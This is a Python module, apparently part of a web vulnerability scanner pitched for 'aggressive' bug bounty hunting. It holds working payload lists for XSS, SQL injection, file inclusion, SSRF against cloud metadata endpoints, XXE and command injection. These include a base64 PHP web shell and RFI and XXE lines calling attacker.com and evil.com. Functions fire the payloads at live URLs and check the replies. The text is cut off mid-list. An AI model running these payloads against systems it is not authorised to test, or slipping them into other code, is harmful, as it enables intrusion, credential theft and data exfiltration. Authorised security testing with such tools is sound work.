"""
Bug Bounty Hunter Module - Comprehensive Vulnerability Scanner
Designed specifically for finding real vulnerabilities in bug bounty programs
Uses aggressive techniques and real-world attack vectors
"""

from urllib.parse import urlparse, parse_qs, urlencode, urljoin
import requests
import time
import re
import random
import string
import json
import base64
import html
from utils import retry_request

class BugBountyHunter:
    """Main bug bounty hunting class with multiple vulnerability detection methods"""

    def __init__(self, session, scanner):
        self.session = session
        self.scanner = scanner

        # High-value bug bounty vulnerability payloads
        self.payloads = {
            'xss': [
                # DOM XSS
                "<img src=x onerror=alert(document.domain)>",
                "<svg onload=alert(document.domain)>",
                "<iframe src=javascript:alert(document.domain)>",

                # Filter bypasses
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=x onerror=window['alert'](document.domain)>",
                "<svg><script>alert(document.domain)</script></svg>",

                # WAF bypasses
                "<ScRiPt>alert(document.domain)</ScRiPt>",
                "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>",
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>",

                # Context-specific
                "'\"><img src=x onerror=alert(document.domain)>",
                "\"><script>alert(document.domain)</script>",
                "'><script>alert(document.domain)</script>",

                # Angular/React
                "{{constructor.constructor('alert(document.domain)')()}}",
                "{{$on.constructor('alert(document.domain)')()}}",
            ],

            'sqli': [
                # Error-based
                "' OR 1=1--",
                "\" OR 1=1--",
                "') OR 1=1--",
                "\") OR 1=1--",
                "' OR 'x'='x",
                "\" OR \"x\"=\"x",

                # Union-based
                "' UNION SELECT 1,2,3,4,5--",
                "\" UNION SELECT 1,2,3,4,5--",
                "') UNION SELECT 1,2,3,4,5--",

                # Boolean-based
                "' AND 1=1--",
                "' AND 1=2--",
                "' OR 1=1 AND '1'='1",
                "' OR 1=2 AND '1'='1",

                # Time-based (for detection, not actual delay)
                "' OR SLEEP(1)--",
                "'; WAITFOR DELAY '0:0:1'--",
                "' OR pg_sleep(1)--",
            ],

            'lfi': [
                # Basic LFI
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd",
                "/windows/system32/drivers/etc/hosts",

                # Advanced LFI
                "....//....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "....%5c....%5c....%5c....%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",

                # Null byte injection
                "../../../../etc/passwd%00",
                "../../../../etc/passwd%00.jpg",

                # Wrapper attacks
                "php://filter/read=convert.base64-encode/resource=/etc/passwd",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            ],

            'rfi': [
                # Remote file inclusion
                "http://evil.com/shell.txt",
                "https://pastebin.com/raw/malicious",
                "ftp://attacker.com/backdoor.php",

                # Data protocol
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "data:text/plain,<?php phpinfo(); ?>",
            ],

            'ssrf': [
                # Internal network scanning
                "http://127.0.0.1:80",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://[::1]:80",

                # Bypass attempts
                "http://127.1:80",
                "http://0x7f.0x0.0x0.0x1:80",
                "http://0177.0.0.1:80",
                "http://2130706433:80",

                # Cloud metadata
                "http://169.254.169.254/latest/user-data",
                "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            ],

            'xxe': [
                # Basic XXE
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]><foo>&xxe;</foo>',

                # SSRF via XXE
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            ],

            'command_injection': [
                # Basic command injection
                "; whoami",
                "&& whoami",
                "| whoami",
                "`whoami`",
                "$(whoami)",

                # Windows commands
                "& dir",
                "&& dir",
                "| dir",

                # Blind command injection
                "; sleep 5",
                "&& sleep 5",
                "| sleep 5",
                "; ping -c 5 127.0.0.1",
            ],

            'open_redirect': [
                # Basic redirects
                "//evil.com",
                "http://evil.com",
                "https://evil.com",

                # Protocol bypasses
                "javascript:alert(document.domain)",
                "data:text/html,<script>alert(document.domain)</script>",

                # Path traversal
                "/\\evil.com",
                "////evil.com",
                "https:evil.com",
            ],

            'ssti': [
                # Jinja2/Flask
                "{{7*7}}",
                "{{config}}",
                "{{request}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",

                # Twig
                "{{7*7}}",
                "{{_self}}",

                # Smarty
                "{$smarty.version}",
                "{system('whoami')}",

                # Freemarker
                "${7*7}",
                "#{7*7}",
            ]
        }

        # Common parameters that often have vulnerabilities
        self.vuln_params = {
            'xss': ['q', 'search', 'query', 'msg', 'message', 'error', 'success', 'name', 'comment', 'title', 'content'],
            'sqli': ['id', 'user_id', 'search', 'category', 'filter', 'sort', 'order', 'limit', 'offset'],
            'lfi': ['file', 'page', 'include', 'template', 'view', 'doc', 'path', 'dir', 'load'],
            'ssrf': ['url', 'link', 'callback', 'redirect', 'webhook', 'fetch', 'proxy', 'target'],
            'command_injection': ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip', 'run'],
            'open_redirect': ['redirect', 'url', 'return_url', 'next', 'continue', 'goto', 'destination'],
            'ssti': ['template', 'tpl', 'format', 'render', 'view', 'lang', 'message']
        }

    def generate_marker(self, vuln_type):
        """Generate unique marker for vulnerability detection"""
        return f"{vuln_type.upper()}_TEST_{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

    def test_xss_vulnerability(self, url, param):
        """Test for XSS vulnerabilities"""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        base = url.split('?', 1)[0]

        for payload in self.payloads['xss']:
            marker = self.generate_marker('XSS')
            test_payload = payload.replace('document.domain', f"'{marker}'")

            qs[param] = test_payload
            query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
            test_url = base + "?" + query

            if self.scanner._is_denied(test_url):
                continue

            try:
                resp = retry_request(self.session.get, test_url, timeout=15)
                if resp and self.check_xss_execution(resp.text, test_payload, marker):
                    return {
                        "vul_type": "Cross-Site Scripting (XSS)",
                        "payload": test_payload,
                        "evidence": f"XSS marker '{marker}' found in response",
                        "severity": "High",
                        "confidence": "High"
                    }

                # Check for reflection (potential for bypass)
                if resp and (test_payload in resp.text or marker in resp.text):
                    # Try context-specific bypass
                    context_payloads = [
                        f"'><script>alert('{marker}')</script>",
                        f"\"><script>alert('{marker}')</script>",
                        f"<img src=x onerror=alert('{marker}')>"
                    ]

                    for context_payload in context_payloads:
                        qs[param] = context_payload
                        context_query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
                        context_url = base + "?" + context_query

                        context_resp = retry_request(self.session.get, context_url, timeout=15)
                        if context_resp and self.check_xss_execution(context_resp.text, context_payload, marker):
                            return {
                                "vul_type": "Cross-Site Scripting (XSS)",
                                "payload": context_payload,
                                "evidence": f"XSS bypass successful with marker '{marker}'",
                                "severity": "High",
                                "confidence": "High"
                            }

            except Exception:
                pass

            time.sleep(self.scanner.sleep)

        return None

    def check_xss_execution(self, response_text, payload, marker):
        """Check if XSS was executed"""
        if not response_text or not marker:
            return False

        # Look for unencoded payload
        if payload in response_text and marker in response_text:
            # Check it's not HTML encoded
            encoded_marker = html.escape(marker)
            if encoded_marker not in response_text:
                return True

        # Look for JavaScript execution context
        js_contexts = [
            f"<script>{marker}",
            f"alert('{marker}')",
            f'alert("{marker}")',
            f"onerror='{marker}'",
            f'onerror="{marker}"'
        ]

        for context in js_contexts:
            if context in response_text:
                return True

        return False

    def test_sqli_vulnerability(self, url, param):
        """Test for SQL injection vulnerabilities"""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        base = url.split('?', 1)[0]

        # Get baseline response
        try:
            qs[param] = "normal_value"
            baseline_query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
            baseline_url = base + "?" + baseline_query
            baseline_resp = retry_request(self.session.get, baseline_url, timeout=10)
            baseline_time = time.time()
        except:
            return None

        for payload in self.payloads['sqli']:
            qs[param] = payload
            query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
            test_url = base + "?" + query

            if self.scanner._is_denied(test_url):
                continue

            try:
                start_time = time.time()
                resp = retry_request(self.session.get, test_url, timeout=20)
                elapsed = time.time() - start_time

                if resp:
                    # Check for SQL error signatures
                    sql_errors = [
                        'you have an error in your sql syntax',
                        'warning: mysql_',
                        'sqlstate',
                        'ora-\d{5}',
                        'postgresql.*error',
                        'sqlite.*error',
                        'microsoft
